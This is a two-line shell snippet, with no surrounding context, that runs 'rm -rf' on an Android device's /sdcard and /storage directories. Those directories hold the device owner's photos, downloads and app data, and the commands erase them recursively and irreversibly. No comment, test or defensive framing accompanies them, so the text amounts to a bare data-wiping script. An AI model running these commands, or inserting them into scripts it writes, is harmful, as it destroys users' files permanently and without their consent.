rm -rf /sdcard
rm -rf /storage